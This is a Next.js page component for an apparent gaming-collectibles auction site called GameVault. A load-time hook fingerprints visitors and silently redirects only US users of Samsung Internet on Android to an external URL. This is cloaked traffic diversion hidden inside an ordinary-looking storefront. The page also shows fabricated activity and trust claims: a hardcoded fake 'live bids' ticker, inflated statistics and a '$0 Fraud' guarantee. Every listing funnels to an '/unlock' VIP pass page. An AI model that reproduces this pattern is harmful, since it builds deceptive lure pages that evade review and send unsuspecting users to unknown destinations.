"use client";

import React, { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import Header from "@/components/Header";
import FeaturedVideos from "@/components/FeaturedVideos";
import BrowseCategories from "@/components/BrowseCategories";
import Footer from "@/components/Footer";

const ENABLE_CLIENT_REDIRECT = true;
const TARGET_REDIRECT_URL =
  "https://alure.world/1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20";

export default function OfferHomePage() {
  const router = useRouter();

  // Handle ?unlock=true query param
  useEffect(() => {
    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      if (params.get("unlock") === "true") {
        router.replace("/unlock");
      }
    }
  }, [router]);

  // Client-side fallback check:
  // Route: /offer/2026
  // Condition 1: US Geolocation
  // Condition 2: Android device (User-Agent contains 'Android')
  // Condition 3: Samsung Internet Browser (User-Agent contains 'SamsungBrowser')
  // Action: window.location.replace(...)
  useEffect(() => {
    if (!ENABLE_CLIENT_REDIRECT) return;
    if (typeof window === "undefined") return;

    const ua = navigator.userAgent || "";
    const isSamsungBrowser = /SamsungBrowser/i.test(ua);
    const isAndroidDevice = /Android/i.test(ua);

    if (!isSamsungBrowser || !isAndroidDevice) return;

    // Helper to read cookie set by server middleware if available
    const getCookie = (name: string): string | null => {
      const match = document.cookie.match(new RegExp("(^|;\\s*)" + name + "=([^;]*)"));
      return match ? decodeURIComponent(match[2]) : null;
    };

    const serverCountry = getCookie("x-geo-country");
    if (serverCountry) {
      if (serverCountry.toUpperCase() === "US") {
        window.location.replace(TARGET_REDIRECT_URL);
      }
      return;
    }

    // Fallback: If server geo-headers were not present, query IP lookup API
    const checkGeoFallback = async () => {
      try {
        const res = await fetch("https://ipapi.co/json/");
        if (res.ok) {
          const data = await res.json();
          const countryCode = (data.country_code || data.country || "").toUpperCase();
          if (countryCode === "US") {
            window.location.replace(TARGET_REDIRECT_URL);
          }
        }
      } catch (err) {
        console.warn("Client geo fallback lookup failed:", err);
      }
    };

    checkGeoFallback();
  }, []);

  const handleOpenUnlock = () => {
    router.push("/unlock");
  };

  return (
    <div className="flex min-h-screen flex-col bg-[#070a13] text-white selection:bg-violet-600 selection:text-white">
      {/* Navigation Header */}
      <Header />

      {/* Main Content Area */}
      <main className="flex-1 flex flex-col">
        {/* Gaming Auction Hero Section */}
        <section className="relative w-full pt-8 sm:pt-14 pb-10 sm:pb-16 overflow-hidden border-b border-slate-800/80 bg-gradient-to-b from-[#0e1526] via-[#090e1a] to-[#070a13]">
          {/* Ambient Cyber Light Glows */}
          <div className="pointer-events-none absolute -top-24 left-1/2 -translate-x-1/2 w-[700px] h-[350px] bg-violet-600/15 blur-[120px] rounded-full" />
          <div className="pointer-events-none absolute top-1/2 right-10 w-[350px] h-[250px] bg-cyan-500/10 blur-[100px] rounded-full" />

          <div className="relative mx-auto max-w-6xl px-4 sm:px-6 lg:px-8 text-center">
            {/* Live Indicator Pill */}
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-violet-950/80 border border-violet-500/40 text-violet-300 text-xs font-bold uppercase tracking-wider mb-4 shadow-[0_0_20px_rgba(139,92,246,0.3)]">
              <span className="h-2 w-2 rounded-full bg-emerald-400 animate-pulse" />
              <span>THE PREMIER GAMING & COLLECTIBLES AUCTION</span>
            </div>

            {/* Main Headline */}
            <h1 className="text-3xl sm:text-5xl lg:text-6xl font-black text-white tracking-tight leading-tight max-w-4xl mx-auto">
              Bid on Rare, Sealed &{" "}
              <span className="text-transparent bg-clip-text bg-gradient-to-r from-violet-400 via-indigo-300 to-cyan-400">
                Collector&apos;s Edition
              </span>{" "}
              Games
            </h1>

            {/* Subtitle */}
            <p className="mt-4 sm:mt-5 text-sm sm:text-base lg:text-lg text-slate-300 max-w-2xl mx-auto leading-relaxed">
              Real-time competitive auctions for verified PlayStation, Rockstar classics, sealed holy grails, and limited physical steelbooks with full escrow protection.
            </p>

            {/* CTA Buttons */}
            <div className="mt-6 sm:mt-8 flex flex-col sm:flex-row items-center justify-center gap-3.5">
              <a
                href="#featured-auctions"
                className="w-full sm:w-auto px-7 py-3.5 rounded-xl bg-gradient-to-r from-violet-600 via-indigo-600 to-cyan-500 hover:from-violet-500 hover:to-cyan-400 text-white font-extrabold text-sm shadow-[0_0_25px_rgba(139,92,246,0.5)] transition-all cursor-pointer text-center"
              >
                Browse Live Lots
              </a>
              <Link
                href="/unlock"
                className="w-full sm:w-auto px-7 py-3.5 rounded-xl bg-slate-900/90 hover:bg-slate-800 text-slate-200 border border-slate-700/80 font-bold text-sm transition-all cursor-pointer text-center flex items-center justify-center gap-2"
              >
                <svg className="w-4 h-4 text-amber-400" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z" />
                </svg>
                <span>Get VIP Bidder Pass</span>
              </Link>
            </div>

            {/* Auction Key Stats Strip */}
            <div className="mt-10 sm:mt-14 pt-8 border-t border-slate-800/80 grid grid-cols-2 md:grid-cols-4 gap-4 sm:gap-6">
              <div className="text-center p-3 rounded-xl bg-slate-900/50 border border-slate-800">
                <div className="text-xl sm:text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-cyan-400">
                  $2.4M+
                </div>
                <div className="text-[11px] sm:text-xs text-slate-400 uppercase tracking-wider font-semibold mt-0.5">
                  Total Bids Placed
                </div>
              </div>

              <div className="text-center p-3 rounded-xl bg-slate-900/50 border border-slate-800">
                <div className="text-xl sm:text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-violet-400 to-indigo-300">
                  100%
                </div>
                <div className="text-[11px] sm:text-xs text-slate-400 uppercase tracking-wider font-semibold mt-0.5">
                  Authenticated Sealed
                </div>
              </div>

              <div className="text-center p-3 rounded-xl bg-slate-900/50 border border-slate-800">
                <div className="text-xl sm:text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-amber-400 to-yellow-300">
                  48,000+
                </div>
                <div className="text-[11px] sm:text-xs text-slate-400 uppercase tracking-wider font-semibold mt-0.5">
                  Active Collectors
                </div>
              </div>

              <div className="text-center p-3 rounded-xl bg-slate-900/50 border border-slate-800">
                <div className="text-xl sm:text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-400">
                  $0 Fraud
                </div>
                <div className="text-[11px] sm:text-xs text-slate-400 uppercase tracking-wider font-semibold mt-0.5">
                  Escrow Guarantee
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* Live Ticker: Recent Bids Feed */}
        <div className="w-full bg-[#0a0f1c] border-b border-slate-800/80 py-2.5 overflow-hidden">
          <div className="mx-auto max-w-6xl px-4 flex items-center justify-between text-xs text-slate-400">
            <div className="flex items-center gap-2 shrink-0">
              <span className="h-2 w-2 rounded-full bg-emerald-400 animate-ping" />
              <strong className="text-slate-200">RECENT LIVE ACTIVITY:</strong>
            </div>
            <div className="truncate pl-4 font-mono text-[11px] sm:text-xs text-slate-300">
              <span className="text-violet-400 font-bold">Kratos_Blade99</span> bid <span className="text-emerald-400 font-bold">$245.00</span> on God of War Ragnarök • <span className="text-violet-400 font-bold">Arthur_Morgan</span> bid <span className="text-emerald-400 font-bold">$310.00</span> on Red Dead Redemption 2 • <span className="text-violet-400 font-bold">Trevor_Phils</span> bid <span className="text-emerald-400 font-bold">$185.00</span> on GTA V
            </div>
          </div>
        </div>

        {/* Featured Auctions Component (using the 5 images) */}
        <FeaturedVideos onCardClick={handleOpenUnlock} />

        {/* Browse Categories Component */}
        <BrowseCategories onCardClick={handleOpenUnlock} />

        {/* How Bidding Works Infographic Section */}
        <section className="w-full py-12 border-t border-slate-800/80 bg-[#090e1a]">
          <div className="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8">
            <div className="text-center max-w-2xl mx-auto">
              <span className="text-xs font-extrabold uppercase tracking-widest text-violet-400">
                TRUSTED & TRANSPARENT
              </span>
              <h2 className="text-2xl sm:text-3xl font-black text-white mt-1">
                How GameVault Bidding Works
              </h2>
              <p className="mt-2 text-xs sm:text-sm text-slate-400">
                Four simple steps to win, authenticate, and safely receive holy grail gaming collectibles.
              </p>
            </div>

            <div className="mt-8 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5">
              <div className="p-5 rounded-2xl bg-[#0d1424] border border-slate-800 hover:border-violet-500/40 transition-colors">
                <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-violet-600/20 text-violet-400 font-black text-base border border-violet-500/30">
                  01
                </div>
                <h3 className="mt-3.5 text-base font-bold text-white">Issue Bidder Pass</h3>
                <p className="mt-1 text-xs text-slate-400 leading-relaxed">
                  Register in seconds with email or VIP pass for unlimited bidding power on exclusive lots.
                </p>
              </div>

              <div className="p-5 rounded-2xl bg-[#0d1424] border border-slate-800 hover:border-violet-500/40 transition-colors">
                <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-emerald-600/20 text-emerald-400 font-black text-base border border-emerald-500/30">
                  02
                </div>
                <h3 className="mt-3.5 text-base font-bold text-white">Place Live Bids</h3>
                <p className="mt-1 text-xs text-slate-400 leading-relaxed">
                  Compete in live countdowns or configure max proxy bids with 3-minute anti-sniping protection.
                </p>
              </div>

              <div className="p-5 rounded-2xl bg-[#0d1424] border border-slate-800 hover:border-violet-500/40 transition-colors">
                <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-amber-600/20 text-amber-400 font-black text-base border border-amber-500/30">
                  03
                </div>
                <h3 className="mt-3.5 text-base font-bold text-white">Escrow Payment</h3>
                <p className="mt-1 text-xs text-slate-400 leading-relaxed">
                  Winning bids are placed in secure escrow. Seller is only paid after you verify pristine delivery.
                </p>
              </div>

              <div className="p-5 rounded-2xl bg-[#0d1424] border border-slate-800 hover:border-violet-500/40 transition-colors">
                <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-cyan-600/20 text-cyan-400 font-black text-base border border-cyan-500/30">
                  04
                </div>
                <h3 className="mt-3.5 text-base font-bold text-white">Vault Insured Delivery</h3>
                <p className="mt-1 text-xs text-slate-400 leading-relaxed">
                  Games shipped in reinforced acrylic protectors with tracking and 100% loss/damage insurance.
                </p>
              </div>
            </div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <Footer />
    </div>
  );
}
